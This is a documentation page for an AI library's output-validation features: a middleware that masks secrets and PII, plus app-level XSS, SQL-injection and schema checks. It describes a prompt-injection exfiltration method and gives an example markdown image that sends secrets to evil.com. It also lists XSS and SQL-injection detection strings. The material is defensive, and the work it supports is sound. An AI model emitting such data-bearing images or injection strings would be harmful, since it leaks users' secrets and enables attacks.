---
description: >-
  Validating and filtering AI-generated output with the built-in Output Guard middleware and application-level checks.
icon: check
---

# Output Validation

### Output Guard Middleware (built-in)

`OutputGuardMiddleware` scrubs the model's response **before it reaches your application or the user**, defending against two risks:

1. **Secret/PII leakage** — the model echoes an email, SSN, credit card, API key, or private key into its reply. These are masked.
2. **Data exfiltration** — an injected instruction makes the model emit a data-bearing markdown image (`![x](https://evil.com?data=<secrets>)`) that leaks when the response is rendered. These are stripped.

It's 100% offline — regex redaction, a Luhn check for credit cards, and exfil stripping, no second model, no network:

```javascript
import bxModules.bxai.models.middleware.security.OutputGuardMiddleware;

guard = new OutputGuardMiddleware(
    action             : "redact",           // redact (default) | flag | block
    stripMarkdownImages: true,               // strip data-exfil markdown images (default)
    allowedImageHosts  : [ "mysite.com" ]    // hosts to keep (empty = strip all external)
)

agent = aiAgent( name: "support-bot", model: aiModel( "claude" ), middleware: [ guard ] )
```

| Action | Behavior |
|---|---|
| `redact` *(default)* | Mask secrets + strip exfil, then let the clean response through |
| `flag` | Leave content intact, but stamp findings on `chatRequest.providerOptions.securityFindings` and log |
| `block` | Throw `BXAI.SecurityViolation` when anything is found |

Built-in redactors (opt-in set): `email`, `ssn`, `creditCard`, `awsAccessKey`, `privateKeyBlock`, `jwt`, `genericApiToken` — plus `phone` and your own via `customRedactors`, which accepts either a regex string or a closure `function( text, mask )` for dynamic redaction (partial masking, keep-last-4, an external lookup, etc.).

```javascript
guard = new OutputGuardMiddleware(
    customRedactors: {
        internalCode: "ACME-[0-9]+",                                            // regex: mask every match
        account     : ( text, mask ) => reReplace( text, "[0-9]+([0-9]{4})", mask & "\1", "all" )  // closure: dynamic
    }
)
```

### Application-Level Output Checks

`OutputGuardMiddleware` covers secrets and exfiltration; if your application renders AI output into HTML or SQL, it's still your responsibility to treat that output as untrusted at the render/query boundary — **never trust AI output blindly**:

```javascript
class {
    function validateOutput( required string output ) {
        // Check for code injection attempts
        if ( output.find( "<script>" ) > 0 ||
             output.find( "javascript:" ) > 0 ||
             output.find( "eval(" ) > 0 ) {
            writeLog( "AI output contains potential XSS", "security" )
            throw "Invalid AI response"
        }

        // Check for SQL injection patterns
        if ( output.findNoCase( "DROP TABLE" ) > 0 ||
             output.findNoCase( "'; DELETE FROM" ) > 0 ) {
            writeLog( "AI output contains potential SQL injection", "security" )
            throw "Invalid AI response"
        }

        // Check for sensitive data leakage
        if ( containsPII( output ) ) {
            writeLog( "AI output may contain PII", "warning" )
            return redactPII( output )
        }

        return output
    }

    function safeAIChat( required string prompt ) {
        var response = aiChat( arguments.prompt )
        return validateOutput( response )
    }
}
```

### Structured Output Validation

```javascript
class {
    function validateStructuredOutput( required any output, required struct schema ) {
        // Validate against schema
        if ( !isStruct( arguments.output ) ) {
            throw "Output must be a struct"
        }

        // Check required fields
        for ( field in arguments.schema.required ?: [] ) {
            if ( !structKeyExists( arguments.output, field ) ) {
                throw "Missing required field: #field#"
            }
        }

        // Validate types
        for ( field in arguments.schema.properties ) {
            if ( structKeyExists( arguments.output, field ) ) {
                var expectedType = arguments.schema.properties[ field ].type
                var actualValue = arguments.output[ field ]

                if ( expectedType == "string" && !isSimpleValue( actualValue ) ) {
                    throw "Field #field# must be a string"
                }

                if ( expectedType == "number" && !isNumeric( actualValue ) ) {
                    throw "Field #field# must be numeric"
                }

                if ( expectedType == "array" && !isArray( actualValue ) ) {
                    throw "Field #field# must be an array"
                }
            }
        }

        return true
    }
}
```
